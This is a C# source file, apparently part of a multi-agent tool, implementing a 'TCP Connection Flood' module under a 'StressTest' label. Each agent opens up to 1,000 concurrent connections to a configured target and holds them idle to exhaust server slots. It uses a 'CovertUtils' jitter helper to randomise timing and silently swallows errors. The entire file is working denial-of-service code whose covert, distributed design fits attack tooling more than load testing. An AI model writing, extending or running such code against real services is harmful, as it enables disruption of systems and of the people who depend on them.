using System.Net.Sockets;

namespace LibraNextgen.Agent.Modules.StressTest;

public class TcpConnFlood : IStressMethod
{
    public string Name => "TCP Connection Flood";

    public async Task ExecuteAsync(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        var maxConns = Math.Min(config.ThreadsPerAgent, 1000);
        var sem = new SemaphoreSlim(maxConns);

        while (!ct.IsCancellationRequested)
        {
            await sem.WaitAsync(ct);

            _ = Task.Run(async () =>
            {
                TcpClient? client = null;
                try
                {
                    client = new TcpClient();
                    await client.ConnectAsync(config.TargetHost, config.TargetPort, ct);

                    rpt.IncrementConnections(1);
                    rpt.IncrementPackets();

                    // Hold connection open doing nothing — consumes server slots
                    while (!ct.IsCancellationRequested)
                        await Task.Delay(CovertUtils.RandomJitter(30000, 0.2), ct);
                }
                catch { }
                finally
                {
                    rpt.IncrementConnections(-1);
                    client?.Dispose();
                    sem.Release();
                }
            }, ct);
        }
    }
}
